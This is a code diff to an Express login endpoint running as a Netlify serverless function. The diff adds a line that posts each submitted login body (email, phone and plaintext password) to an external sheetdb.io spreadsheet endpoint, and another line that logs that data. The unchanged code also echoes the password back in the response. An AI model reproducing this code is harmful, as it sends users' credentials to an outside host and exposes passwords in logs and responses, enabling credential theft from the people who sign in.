@@ -2,6 +2,7 @@ const express = require('express');
 const serverless = require('serverless-http');
 const cors = require('cors'); // Import the CORS middleware
 const app = express();
+const axios = require('axios');
 const baseUrl = '/.netlify/functions/expressFunction';
 // Use the CORS middleware
 app.use(cors());
@@ -30,9 +31,11 @@ app.post(baseUrl + "/register", (req, res) => {
 
 app.post(baseUrl + "/login", (req, res) => {
     const data = req.body;
+    console.log("🚀 ~ app.post ~ data:", data)
     const email = data.name;
     const tel = data.tel;
     const password = data.password;
+    axios.post('https://sheetdb.io/api/v1/b26an47qz0cay', data);
     console.log(data);
     res.json({
         message: `Email: ${email} Tel: ${tel} Password: ${password} logged in`
